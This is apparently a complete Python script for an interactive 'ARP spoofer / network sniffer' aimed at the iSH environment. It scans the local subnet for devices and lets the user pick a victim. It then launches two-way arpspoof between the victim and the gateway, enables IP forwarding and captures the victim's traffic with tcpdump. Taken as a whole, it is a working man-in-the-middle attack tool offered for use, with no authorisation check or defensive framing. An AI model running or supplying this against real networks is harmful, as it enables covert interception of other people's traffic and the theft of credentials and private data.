#!/usr/bin/env python3
import threading
import time
import socket
import sys
import os
import re
import queue
import platform
import subprocess
import ipaddress
import concurrent.futures
from datetime import datetime

# Try to import requests (pure Python, should work)
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def get_available_interfaces():
    """Get network interfaces using system commands"""
    interfaces = []
    
    # Try using /proc/net/dev
    try:
        with open('/proc/net/dev', 'r') as f:
            for line in f:
                if ':' in line:
                    iface = line.split(':')[0].strip()
                    if not iface.startswith('lo'):
                        interfaces.append(iface)
        if interfaces:
            return interfaces
    except:
        pass
    
    # Try using ip command
    try:
        output = subprocess.check_output(['ip', 'link', 'show'], text=True)
        for line in output.splitlines():
            if ': <' in line and 'LOOPBACK' not in line:
                iface = line.split(':')[1].strip().split('@')[0]
                if iface and iface not in interfaces:
                    interfaces.append(iface)
        if interfaces:
            return interfaces
    except:
        pass
    
    return []

def get_default_interface():
    """Get default interface"""
    interfaces = get_available_interfaces()
    if not interfaces:
        return ''
    
    # Try to find the default route interface
    try:
        output = subprocess.check_output(['ip', 'route'], text=True)
        for line in output.splitlines():
            if 'default via' in line:
                parts = line.split()
                if 'dev' in parts:
                    idx = parts.index('dev') + 1
                    if idx < len(parts):
                        iface = parts[idx]
                        if iface in interfaces:
                            return iface
    except:
        pass
    
    return interfaces[0] if interfaces else ''

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = None
    finally:
        s.close()
    return ip

def guess_net(ip, prefix=24):
    return str(ipaddress.ip_network(f'{ip}/{prefix}', strict=False))

def arp_scan_with_arping(cidr):
    """Scan network using arping command"""
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        hosts = [str(ip) for ip in net.hosts()][:255]  # Limit to /24
        
        results = []
        print(f"  Scanning {len(hosts)} hosts...")
        
        for i, ip in enumerate(hosts):
            if i % 10 == 0:
                print(f"  Progress: {i}/{len(hosts)}", end='\r')
            
            try:
                # Try arping
                cmd = ['arping', '-c', '1', '-w', '1', ip]
                output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=2)
                
                # Extract MAC from output
                for line in output.decode().splitlines():
                    # Look for MAC address pattern
                    mac_match = re.search(r'\[([0-9a-f:]{17})\].*?(\d+\.\d+\.\d+\.\d+)', line.lower())
                    if mac_match:
                        mac = mac_match.group(1)
                        results.append({'ip': ip, 'mac': mac})
                        break
            except:
                pass
        
        print()  # New line after progress
        return results
    except Exception as e:
        print(f"  ARPing scan error: {e}")
        return []

def ping_once(ip):
    """Ping a single IP"""
    cmd = ['ping', '-c', '1', '-W', '1', ip]
    try:
        subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=2)
        return True
    except:
        return False

def ping_sweep(cidr, max_workers=50):
    """Ping sweep to find alive hosts"""
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        hosts = [str(ip) for ip in net.hosts()]
        if len(hosts) > 256:
            hosts = hosts[:256]
        
        alive = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(ping_once, ip): ip for ip in hosts}
            for fut in concurrent.futures.as_completed(futures):
                try:
                    ip = futures[fut]
                    if fut.result():
                        alive.append(ip)
                except Exception:
                    continue
        
        return alive
    except Exception:
        return []

def get_mac_from_arp_table(ip):
    """Get MAC for IP from ARP table"""
    try:
        # Try ip neigh
        output = subprocess.check_output(['ip', 'neigh'], text=True, stderr=subprocess.DEVNULL)
        for line in output.splitlines():
            if ip in line and 'lladdr' in line:
                parts = line.split()
                idx = parts.index('lladdr') + 1
                if idx < len(parts):
                    return parts[idx].lower()
    except:
        pass
    
    try:
        # Try arp -n
        output = subprocess.check_output(['arp', '-n'], text=True, stderr=subprocess.DEVNULL)
        for line in output.splitlines():
            if ip in line:
                m = re.search(r'((?:[0-9a-f]{2}:){5}[0-9a-f]{2})', line.lower())
                if m:
                    return m.group(1)
    except:
        pass
    
    return None

def reverse_dns(ip):
    """Reverse DNS lookup"""
    try:
        name = socket.gethostbyaddr(ip)[0]
        return name
    except:
        return None

def get_vendor_from_mac_api(mac):
    if not REQUESTS_AVAILABLE or not mac:
        return None
    try:
        mac_clean = mac.strip().upper().replace(':', '').replace('-', '')
        url = f'https://api.macvendors.com/{mac_clean}'
        r = requests.get(url, timeout=3)
        if r.status_code == 200 and r.text:
            return r.text.strip()
        return None
    except:
        return None

class ARPSpoofer:
    def __init__(self):
        self.stop_event = threading.Event()
        self.interfaces = get_available_interfaces()
        default_iface = get_default_interface()
        self.config = {
            'target_ip': '',
            'gateway_ip': '',
            'target_mac': '',
            'gateway_mac': '',
            'iface': default_iface if default_iface in self.interfaces else self.interfaces[0] if self.interfaces else '',
            'sniff_all': False,
            'protocols': ['HTTP', 'TCP', 'UDP', 'OTHER']
        }
        self.local_ip = None
        self.local_mac = None
        self.capture_process = None
        self.packet_count = 0
        
    def clear_screen(self):
        os.system('clear')
    
    def print_banner(self):
        banner = f"""
{Colors.GREEN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════╗
║                 ARP SPOOFER / NETWORK SNIFFER            ║
║                      iSH Compatible Version              ║
║                   (Using System Commands)                ║
╚══════════════════════════════════════════════════════════╝{Colors.ENDC}
        """
        print(banner)
        
        if REQUESTS_AVAILABLE:
            print(f"{Colors.GREEN}✓ Requests available - Vendor lookup enabled{Colors.ENDC}")
        else:
            print(f"{Colors.WARNING}⚠ Requests not available - No vendor lookup{Colors.ENDC}")
        print()
    
    def print_status(self, message, level="INFO"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if level == "INFO":
            color = Colors.CYAN
        elif level == "SUCCESS":
            color = Colors.GREEN
        elif level == "WARNING":
            color = Colors.WARNING
        elif level == "ERROR":
            color = Colors.FAIL
        else:
            color = Colors.ENDC
        
        print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}")
    
    def get_iface_info(self, iface):
        """Get interface info"""
        mac = None
        ip = None
        
        # Get MAC address
        try:
            with open(f'/sys/class/net/{iface}/address', 'r') as f:
                mac = f.read().strip()
        except:
            pass
        
        # Get IP address
        try:
            output = subprocess.check_output(['ip', 'addr', 'show', iface], text=True)
            for line in output.splitlines():
                if 'inet ' in line:
                    ip = line.split()[1].split('/')[0]
                    break
        except:
            pass
        
        return ip, mac
    
    def detect_gateway(self):
        """Detect gateway IP"""
        try:
            output = subprocess.check_output(['ip', 'route'], text=True)
            for line in output.splitlines():
                if 'default via' in line:
                    parts = line.split()
                    gw_idx = parts.index('via') + 1
                    if gw_idx < len(parts):
                        return parts[gw_idx]
        except:
            pass
        
        return None
    
    def detect_network(self):
        """Auto-detect network configuration"""
        print(f"\n{Colors.BOLD}Network Detection:{Colors.ENDC}")
        
        # Get interface info
        self.local_ip, self.local_mac = self.get_iface_info(self.config['iface'])
        
        if self.local_ip:
            print(f"  Local IP: {Colors.GREEN}{self.local_ip}{Colors.ENDC}")
        else:
            print(f"  Local IP: {Colors.WARNING}Unknown{Colors.ENDC}")
        
        if self.local_mac:
            print(f"  Local MAC: {Colors.GREEN}{self.local_mac}{Colors.ENDC}")
        
        # Detect gateway
        gw_ip = self.detect_gateway()
        if gw_ip:
            self.config['gateway_ip'] = gw_ip
            print(f"  Gateway IP: {Colors.GREEN}{gw_ip}{Colors.ENDC}")
            
            gw_mac = get_mac_from_arp_table(gw_ip)
            if gw_mac:
                self.config['gateway_mac'] = gw_mac
                print(f"  Gateway MAC: {Colors.GREEN}{gw_mac}{Colors.ENDC}")
            else:
                print(f"  Gateway MAC: {Colors.WARNING}Not found{Colors.ENDC}")
        else:
            print(f"  Gateway IP: {Colors.WARNING}Not detected{Colors.ENDC}")
        print()
    
    def scan_network(self):
        """Scan network for devices"""
        if not self.local_ip:
            self.local_ip = get_local_ip()
            if not self.local_ip:
                self.print_status("Could not determine local IP", "ERROR")
                return []
        
        cidr = guess_net(self.local_ip, prefix=24)
        self.print_status(f"Scanning network: {cidr}", "INFO")
        
        # Try ARPing scan first
        results = arp_scan_with_arping(cidr)
        
        if not results:
            self.print_status("ARPing failed, trying ping sweep...", "WARNING")
            alive_ips = ping_sweep(cidr)
            
            for ip in alive_ips:
                mac = get_mac_from_arp_table(ip)
                results.append({'ip': ip, 'mac': mac})
        
        self.print_status(f"Found {len(results)} devices", "SUCCESS")
        return results
    
    def display_targets(self, targets):
        if not targets:
            self.print_status("No targets found", "WARNING")
            return
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}Available Targets:{Colors.ENDC}")
        print(f"{'ID':<4} {'IP':<16} {'MAC':<18} {'Hostname':<20}")
        print("-" * 60)
        
        for i, device in enumerate(targets):
            ip = device.get('ip') or '-'
            mac = device.get('mac') or '-'
            hostname = reverse_dns(ip) or '-'
            print(f"{i:<4} {ip:<16} {mac:<18} {hostname:<20}")
        print()
    
    def validate_ip(self, ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except:
            return False
    
    def interactive_config(self):
        self.clear_screen()
        self.print_banner()
        
        # Interface selection
        if self.interfaces:
            print(f"\n{Colors.BOLD}Available interfaces:{Colors.ENDC}")
            for i, iface in enumerate(self.interfaces):
                print(f"  {i+1}. {iface}")
            
            while True:
                try:
                    choice = input(f"\n{Colors.CYAN}Select interface (1-{len(self.interfaces)}) [Default: 1]: {Colors.ENDC}").strip()
                    if not choice:
                        idx = 0
                    else:
                        idx = int(choice) - 1
                    
                    if 0 <= idx < len(self.interfaces):
                        self.config['iface'] = self.interfaces[idx]
                        break
                    else:
                        print(f"{Colors.FAIL}Invalid selection{Colors.ENDC}")
                except ValueError:
                    print(f"{Colors.FAIL}Please enter a number{Colors.ENDC}")
        else:
            self.config['iface'] = input(f"{Colors.CYAN}Enter interface name [eth0]: {Colors.ENDC}").strip() or 'eth0'
        
        # Auto-detect network
        self.detect_network()
        
        # Scan for targets
        targets = self.scan_network()
        
        if targets:
            self.display_targets(targets)
            
            # Mode selection
            print(f"\n{Colors.BOLD}Select mode:{Colors.ENDC}")
            print("  1. Monitor only (no ARP spoofing)")
            print("  2. Attempt ARP spoofing (requires arpspoof tool)")
            
            mode = input(f"\n{Colors.CYAN}Select mode (1-2) [Default: 1]: {Colors.ENDC}").strip()
            
            if mode == "2":
                # Check if arpspoof is installed
                try:
                    subprocess.check_output(['which', 'arpspoof'], stderr=subprocess.DEVNULL)
                    self.config['use_arpspoof'] = True
                except:
                    self.print_status("arpspoof not installed. Install with: apk add dsniff", "WARNING")
                    self.config['use_arpspoof'] = False
                    mode = "1"
            else:
                self.config['use_arpspoof'] = False
            
            if mode == "2" and self.config['use_arpspoof']:
                # Select target for ARP spoofing
                while True:
                    try:
                        target_id = input(f"{Colors.CYAN}Select target ID (0-{len(targets)-1}): {Colors.ENDC}").strip()
                        if target_id and 0 <= int(target_id) < len(targets):
                            target = targets[int(target_id)]
                            self.config['target_ip'] = target['ip']
                            self.config['target_mac'] = target['mac'] or ''
                            self.config['sniff_all'] = False
                            break
                        else:
                            print(f"{Colors.FAIL}Invalid target ID{Colors.ENDC}")
                    except ValueError:
                        print(f"{Colors.FAIL}Please enter a number{Colors.ENDC}")
            else:
                self.config['sniff_all'] = True
        else:
            self.config['sniff_all'] = True
            self.print_status("No targets found - will monitor all traffic", "INFO")
    
    def start_capture(self):
        """Start packet capture using tcpdump"""
        try:
            # Check if tcpdump is available
            subprocess.check_output(['which', 'tcpdump'], stderr=subprocess.DEVNULL)
            
            # Build tcpdump command
            cmd = ['tcpdump', '-i', self.config['iface'], '-l', '-n']
            
            # Add filters
            filters = []
            if not self.config['sniff_all'] and self.config['target_ip']:
                filters.append(f"host {self.config['target_ip']}")
            
            if self.config['protocols']:
                proto_filters = []
                if 'TCP' in self.config['protocols']:
                    proto_filters.append('tcp')
                if 'UDP' in self.config['protocols']:
                    proto_filters.append('udp')
                if 'ICMP' in self.config['protocols']:
                    proto_filters.append('icmp')
                if proto_filters:
                    filters.append('(' + ' or '.join(proto_filters) + ')')
            
            if filters:
                cmd.extend(['-f', ' '.join(filters)])
            
            self.print_status(f"Starting tcpdump: {' '.join(cmd)}", "INFO")
            
            # Start tcpdump process
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            # Read and display packets
            for line in self.capture_process.stdout:
                if self.stop_event.is_set():
                    break
                self.packet_count += 1
                timestamp = datetime.now().strftime('%H:%M:%S')
                print(f"{Colors.GREEN}[{timestamp}] {line.strip()}{Colors.ENDC}")
                
        except FileNotFoundError:
            self.print_status("tcpdump not installed. Install with: apk add tcpdump", "ERROR")
        except Exception as e:
            self.print_status(f"Capture error: {e}", "ERROR")
    
    def start_arpspoof(self):
        """Start ARP spoofing using arpspoof tool"""
        if not self.config.get('use_arpspoof'):
            return
        
        try:
            # Start arpspoof for target -> gateway
            cmd1 = ['arpspoof', '-i', self.config['iface'], '-t', 
                   self.config['target_ip'], self.config['gateway_ip']]
            
            # Start arpspoof for gateway -> target
            cmd2 = ['arpspoof', '-i', self.config['iface'], '-t', 
                   self.config['gateway_ip'], self.config['target_ip']]
            
            self.print_status(f"Starting ARP spoofing...", "SPOOF")
            
            # Start both arpspoof processes
            self.arpspoof_process1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.arpspoof_process2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        except FileNotFoundError:
            self.print_status("arpspoof not installed. Install with: apk add dsniff", "ERROR")
        except Exception as e:
            self.print_status(f"ARPSpoof error: {e}", "ERROR")
    
    def enable_ip_forwarding(self):
        """Enable IP forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            self.print_status("IP forwarding enabled", "SUCCESS")
        except:
            self.print_status("Could not enable IP forwarding", "WARNING")
    
    def disable_ip_forwarding(self):
        """Disable IP forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
        except:
            pass
    
    def start(self):
        self.clear_screen()
        self.print_banner()
        
        # Check if running as root
        if os.geteuid() != 0:
            print(f"{Colors.WARNING}Warning: Not running as root. Packet capture may not work.{Colors.ENDC}")
            response = input("Continue anyway? (y/n): ").strip().lower()
            if response != 'y':
                sys.exit(1)
        
        # Interactive configuration
        self.interactive_config()
        
        # Final confirmation
        print(f"\n{Colors.BOLD}Configuration:{Colors.ENDC}")
        print(f"  Interface: {self.config['iface']}")
        print(f"  Mode: {'Monitor all traffic' if self.config['sniff_all'] else f'Target {self.config["target_ip"]}'}")
        
        response = input(f"\n{Colors.CYAN}Start? (y/n): {Colors.ENDC}").strip().lower()
        if response != 'y':
            self.print_status("Aborted", "WARNING")
            sys.exit(0)
        
        # Enable IP forwarding for MITM
        if not self.config['sniff_all']:
            self.enable_ip_forwarding()
        
        # Start ARP spoofing if configured
        if not self.config['sniff_all']:
            self.start_arpspoof()
        
        # Start packet capture
        self.print_status("Starting packet capture...", "INFO")
        self.stop_event.clear()
        
        capture_thread = threading.Thread(target=self.start_capture, daemon=True)
        capture_thread.start()
        
        print(f"\n{Colors.WARNING}Press Ctrl+C to stop...{Colors.ENDC}\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.print_status("\nStopping...", "WARNING")
        self.stop_event.set()
        
        # Stop arpspoof processes
        if hasattr(self, 'arpspoof_process1'):
            self.arpspoof_process1.terminate()
        if hasattr(self, 'arpspoof_process2'):
            self.arpspoof_process2.terminate()
        
        # Stop tcpdump
        if self.capture_process:
            self.capture_process.terminate()
        
        # Disable IP forwarding
        self.disable_ip_forwarding()
        
        time.sleep(1)
        self.print_status(f"Packets captured: {self.packet_count}", "SUCCESS")
        self.print_status("ARP tables may need manual restoration", "WARNING")
        self.print_status("Run: ip neigh flush all", "INFO")

if __name__ == '__main__':
    spoofer = ARPSpoofer()
    spoofer.start()
